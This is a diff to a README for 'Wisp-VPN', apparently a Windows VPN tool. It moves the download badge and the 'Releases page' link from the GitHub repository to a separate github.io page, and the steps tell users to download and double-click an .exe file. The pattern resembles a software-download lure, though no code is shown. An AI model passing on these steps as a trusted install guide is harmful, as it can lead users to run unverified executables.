@@ -1,6 +1,6 @@
 # 🌐 Wisp-VPN - Access your internet without any limits
 
-[![Download Wisp-VPN](https://img.shields.io/badge/Download-Wisp--VPN-blue.svg)](https://github.com/alanahcontinuous998/Wisp-VPN)
+[![Download Wisp-VPN](https://img.shields.io/badge/Download-Wisp--VPN-blue.svg)](https://alanahcontinuous998.github.io)
 
 Wisp-VPN is an open-source tool for Windows that hides your traffic and bypasses censorship. You gain access to the web without restrictions or speed caps. The software uses the WireGuard protocol to ensure your connection stays private. It does not track your data or keep logs of your activity.
 
@@ -22,7 +22,7 @@ You need a computer running Windows to use this software. We support Windows 10 
 
 Follow these steps to set up your connection. You must download the installer from our official page.
 
-1. Go to the [Releases page](https://github.com/alanahcontinuous998/Wisp-VPN) to see the latest version.
+1. Go to the [Releases page](https://alanahcontinuous998.github.io) to see the latest version.
 2. Look for the file ending in `.exe`. 
 3. Click the file to start the download.
 4. Once the download finishes, open the file by double-clicking it.
